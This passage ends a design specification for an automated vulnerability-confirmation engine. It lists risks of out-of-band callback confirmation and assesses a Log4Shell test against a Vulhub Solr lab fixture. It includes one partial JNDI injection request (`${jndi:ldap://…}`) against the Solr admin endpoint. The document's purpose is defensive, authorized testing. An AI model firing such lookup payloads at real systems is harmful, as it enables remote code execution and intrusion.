   leg, and a lifecycle bolted to the Orchestrator preflight. A **dead collaborator
   silently turns every blind hypothesis inconclusive — which looks exactly like a
   clean target.** Mitigation: a **preflight health-check** (mint a token, self-hit
   over both DNS and HTTP, confirm the loop) gates whether a P6 non-confirmation is
   even allowed to become a research-lead. Unbuilt.

2. **Egress-filtered false-negatives (the P6 floor).** Silence ≠ safety, and it is
   **un-fixable by design** — it is a property of OOB confirmation, not a bug. P6
   cannot distinguish *patched* / *egress-filtered* / *wrong-protocol-listener*; all
   three are silence. Must be **reported as inconclusive**, never as not-vulnerable,
   and disambiguated only by orthogonal signals (manifest version, an in-band tell).

3. **Wall-clock budget, still unsized.** Even evented (§P6.3.2), the tail wait is
   real. `OOB_WAIT_WINDOW` trades recall (some JNDI/async-logging callbacks arrive
   seconds-to-minutes late) against engine latency; `OOB_MAX_PENDING`, the reserved
   OOB lane, and `OOB_REACH_CONFIDENCE_FLOOR` are the §4.3.1 guards — **none sized,
   no measured cost-per-callback.** This is open-question #1 of the parent design, made
   concrete for the most expensive job class.

4. **Scope/safety of an attacker-controlled listener.** The guardrail (§P6.1.5):
   nonce-only (no exfil through it), Clinkz-mints-the-host (never observed content),
   receive-only (can't be steered), in-engagement (docker) / self-hosted-only
   (external), bounded+redacted retention. **The residual risk to prevent
   *structurally*, not by convention:** a careless future payload template that
   encodes target data into the subdomain would turn the confirm channel into an
   **exfil channel** — the carrier must be *incapable* of interpolating target-derived
   data into the callback host, enforced at the carrier.

5. **Correlation under NAT / shared resolvers.** The callback source IP is often the
   target's *resolver*, not the target (DNS-based JNDI/exfil). Source-IP is a **soft
   corroborator, not a gate**; the **nonce is the hard proof**. Scope-of-one-target
   holds because T was sent to exactly one target — but attributing a callback to
   *this* target vs a co-tenant of a shared resolver leans entirely on that fact.
   State it plainly in every P6 finding.

6. **Protocol coverage.** DNS-only egress confirms Log4Shell via the **DNS leg
   alone**, so the collaborator **must** run an authoritative DNS server, not just
   HTTP. Conversely a target that HTTP-egresses but whose DNS is locked to an internal
   resolver may never look up our zone. Which legs to run (DNS + HTTP minimum;
   LDAP/RMI connect-catch for completeness) is a coverage/complexity call.

7. **Reachability: the log-sink channel is unbuilt (Log4Shell co-requisite).** The
   flagship additionally needs the reachability layer to enumerate **logging calls as
   sinks** and accept heuristic grades — a §4.4 "now" item the current slice does not
   implement. **P6 (proof) is necessary but not sufficient** for Log4Shell; the
   log-sink channel is the co-requisite, and it is where the flagship breaks first.

8. **Mode B legal / data-hygiene boundary.** An external collaborator sees callbacks
   that may carry target-identifying data (callback host, timestamps, source IPs) on
   infra outside the engagement. Self-hosted-only mitigates; **the public shared
   interactsh server is a data-egress boundary and must be refused, not defaulted.**

---

## P6.8 · Result

**Log4Shell CVE-2021-44228 — confirmable-on-paper, with two named breaks, both
outside the proof layer.**

- **Environment verified:** Vulhub `log4j/CVE-2021-44228` = Apache Solr **8.11.0**,
  port **8983**, `GET /solr/admin/cores?action=${jndi:ldap://…}`, `log4j-core`
  **2.14.1** — the same product family as the slice-2 Solr SSRF transfer (8.8.1),
  so its source is already partly ingestible.
- **Proof:** reduces to **P6** via a JNDI/DNS callback bearing a fresh nonce —
  **unforgeable, zero-FP by construction**, confirmed with **zero new confirmation
  logic beyond the P6 helper** (it reuses the un-pruned SSRF/CMDi/XXE blind branches
  and one shared `_oob_confirm`). Confirmation needs only the **bare lookup egress**,
  never the second-stage RCE — the guardrail holds.
- **It breaks in exactly two places, both *outside* the proof layer** (as the zero-FP
  framing predicts):
  1. **Reachability — the log-sink channel enumerator is not built.** Until the
     reachability layer treats logging calls as sinks (accepting
     `STATIC_HEURISTIC`/`HYPOTHESIZED` grades), the hypothesis is never generated.
     *This is the flagship's first and hardest break — recall, not proof.*
  2. **Egress dependence — a callback that never comes is inconclusive, not safe.** An
     egress-filtered target, or a ≥2.16-patched one, yields a false-negative-shaped
     silence that **P6 cannot itself disambiguate** from "patched" (only the manifest
     version can). Docker-mode validation sidesteps this for the fixture; real
     hardened targets are where the P6 floor bites.

**The proof primitive is sound.** The flagship's remaining risk is **reachability and
infra**, exactly as the zero-FP design predicts. The disciplined path is therefore
**§P6.6 first**: prove P6 in isolation on a blind SSRF we already confirm in-band
(one new variable, ground-truth check), *then* add the log-sink reachability channel
and take the Log4Shell capstone.

---

*End of specification. Pressure-test the guardrail (§P6.1.5) and the false-negative
floor (§P6.3.4) first — they are where P6's zero-FP promise is either kept or
quietly broken.*
